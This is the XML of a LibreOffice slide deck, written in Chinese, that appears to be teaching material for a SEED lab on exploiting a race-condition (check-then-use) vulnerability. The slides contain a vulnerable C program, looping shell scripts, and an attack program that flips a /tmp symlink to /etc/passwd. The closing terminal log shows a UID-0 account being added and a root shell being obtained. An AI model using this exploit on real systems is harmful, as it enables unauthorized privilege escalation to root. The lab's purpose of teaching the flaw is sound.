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0DC0D06D84FD9B6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3.9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fo:min-height="16.237cm"/>
    </style:style>
    <style:style style:name="gr4" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:fill="none" fo:min-height="5.739cm"/>
    </style:style>
    <style:style style:name="gr5" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:fill="none" fo:min-height="9.549cm"/>
    </style:style>
    <style:style style:name="gr6" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:fill="none" fo:min-height="10.135cm"/>
    </style:style>
    <style:style style:name="gr7" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:fill="none" fo:min-height="6.821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style:font-name="Bitstream Vera Sans" fo:font-size="22pt" fo:letter-spacing="0.06cm" style:font-name-asian="Liberation Mono" style:font-size-asian="22pt" style:font-name-complex="Liberation Mono" style:font-size-complex="22pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph">
      <loext:graphic-properties draw:fill="none"/>
      <style:paragraph-properties fo:text-align="justify"/>
      <style:text-properties style:font-name="Bitstream Vera Sans" fo:font-size="22pt" fo:letter-spacing="0.06cm" style:font-name-asian="Liberation Mono" style:font-size-asian="22pt" style:font-name-complex="Liberation Mono" style:font-size-complex="22pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph">
      <style:paragraph-properties fo:text-align="start"/>
      <style:text-properties style:font-name="Liberation Mono" fo:font-size="24pt" style:font-name-asian="Liberation Mono" style:font-size-asian="24pt" style:font-name-complex="Liberation Mono" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph">
      <loext:graphic-properties draw:fill="none"/>
      <style:paragraph-properties fo:text-align="start"/>
      <style:text-properties style:font-name="Liberation Mono" fo:font-size="24pt" style:font-name-asian="Liberation Mono" style:font-size-asian="24pt" style:font-name-complex="Liberation Mono" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph"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0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Bitstream Vera Sans" fo:font-size="22pt" fo:letter-spacing="0.06cm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016cm" svg:y="1.524cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P1"><text:span text:style-name="T1">竞争条件漏洞</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr1" draw:text-style-name="P3" draw:layer="layout" svg:width="21.082cm" svg:height="14.221cm" svg:x="2.794cm" svg:y="5.083cm">
          <draw:text-box>
            <text:p text:style-name="P2"><text:span text:style-name="T2">char* fn = "/tmp/xyz" </text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2">检查</text:span><text:span text:style-name="T2">access(fn,W_OK) </text:span><text:span text:style-name="T2">使用</text:span><text:span text:style-name="T2">open(fn,"a+") </text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2">在检查和使用的时候</text:span><text:span text:style-name="T2">fn</text:span><text:span text:style-name="T2">所指向的文件不是一个文件 </text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2">检查的时候判断的是用户真实</text:span><text:span text:style-name="T2">ID </text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2">使用的时候判断的是用户的有效</text:span><text:span text:style-name="T2">ID </text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2">本实验的目的是利用这个漏洞获得</text:span><text:span text:style-name="T2">root</text:span><text:span text:style-name="T2">权限 </text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2">我们需要创造竞争条件，来完成这个实验</text:span> </text:p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1"><text:span text:style-name="T1">竞争条件需求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1. 需要这个有漏洞的程序反复运行</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>2. 需要一个反复更改/tmp/xyz文件的链接</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>3. 需要一个反复检查结果是否成功的脚本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ulp</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr3" draw:text-style-name="P6" draw:layer="layout" svg:width="25.654cm" svg:height="16.487cm" svg:x="1.524cm" svg:y="3.071cm">
          <draw:text-box>
            <text:p text:style-name="P5"><text:span text:style-name="T3">#include &lt;stdio.h&gt;</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3">#include &lt;unistd.h&gt;</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3">#include &lt;string.h&gt;</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3">int main()</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3">{</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T3">char * fn = "/tmp/xyz";</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T3">char buffer[] = "0000";</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T3">FILE *fp;</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T3">if(!access(fn, W_OK)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fp = fopen(fn, "r+");</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3"><text:s text:c="8"/></text:span><text:span text:style-name="T3">fseek(fp,-28,SEEK_END);</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3"><text:s text:c="8"/></text:span><text:span text:style-name="T3">fwrite(buffer, sizeof(char),strlen(buffer), fp);</text:span></text:p>
            <text:p text:style-name="P5"><text:span text:style-name="T3"><text:s text:c="8"/></text:span><text:span text:style-name="T3">fclose(fp);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text:span text:style-name="T3">else printf("No permission \n");</text:span></text:p>
            <text:p text:style-name="P5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ttack.sh</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr4" draw:text-style-name="P8" draw:layer="layout" svg:width="17.272cm" svg:height="5.989cm" svg:x="6.35cm" svg:y="8.382cm">
          <draw:text-box>
            <text:p text:style-name="P7"><text:span text:style-name="T2">#!/bin/sh</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2">$a = 0</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2">while ["$a" == "$a"]</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2">do</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2"><text:s text:c="4"/></text:span><text:span text:style-name="T2">./vulp</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2">d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heck.sh</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr5" draw:text-style-name="P8" draw:layer="layout" svg:width="24.638cm" svg:height="9.799cm" svg:x="1.524cm" svg:y="6.096cm">
          <draw:text-box>
            <text:p text:style-name="P7"><text:span text:style-name="T2">#!/bin/sh</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2">old=`ls -l /etc/passwd`</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2">new=`ls -l /etc/passwd`</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2">while [ "$old" = "$new" ]</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2">do</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2"><text:s text:c="4"/></text:span><text:span text:style-name="T2">new=`ls -l /etc/passwd`</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2">done</text:span></text:p>
            <text:p text:style-name="P7"><text:span text:style-name="T2">echo "STOP... The passwd file has been changed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cript.c</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr6" draw:text-style-name="P10" draw:layer="layout" svg:width="28.956cm" svg:height="10.385cm" svg:x="-0.254cm" svg:y="5.334cm">
          <draw:text-box>
            <text:p text:style-name="P9"><text:span text:style-name="T4">#include &lt;unistd.h&gt;</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4">int main()</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4">{</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"><text:s text:c="4"/></text:span><text:span text:style-name="T4">while(1)</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"><text:s text:c="4"/></text:span><text:span text:style-name="T4">{</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"><text:s text:c="8"/></text:span><text:span text:style-name="T4">unlink("/tmp/xyz");</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"><text:s text:c="8"/></text:span><text:span text:style-name="T4">symlink("/home/seed/Seed/race-condition/XYZ","/tmp/xyz");</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"><text:s text:c="8"/></text:span><text:span text:style-name="T4">usleep(10000);</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"><text:s text:c="8"/></text:span><text:span text:style-name="T4">unlink("/tmp/xyz");</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"><text:s text:c="8"/></text:span><text:span text:style-name="T4">symlink("/etc/passwd","/tmp/xyz");</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"><text:s text:c="8"/></text:span><text:span text:style-name="T4">usleep(10000);</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"><text:s text:c="4"/></text:span><text:span text:style-name="T4">}</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"><text:s text:c="4"/></text:span><text:span text:style-name="T4">return 0;</text:span></text:p>
            <text:p text:style-name="P9"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</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr7" draw:text-style-name="P10" draw:layer="layout" svg:width="26.67cm" svg:height="7.071cm" svg:x="0cm" svg:y="7.661cm">
          <draw:text-box>
            <text:p text:style-name="P9"><text:span text:style-name="T4">gu:x:0000:1004::/home/gu:/bin/sh</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4">[03/26/2018 23:17] seed@ubuntu:~/Seed/race-condition$ su gu</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4">Password: </text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"># </text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4"># whoami</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4">root</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T4">#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0DC0D06D84FD9B6F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0:18:13.460124790</meta:creation-date>
    <meta:editing-duration>PT6M24S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/6.0.2.1.0$Linux_X86_64 LibreOffice_project/00m0$Build-1</meta:generator>
    <dc:title>Blue Curve</dc:title>
    <dc:date>2018-03-27T10:34:48.188550207</dc:date>
    <meta:document-statistic meta:object-count="63"/>
  </office:meta>
</office:document-meta>
</file>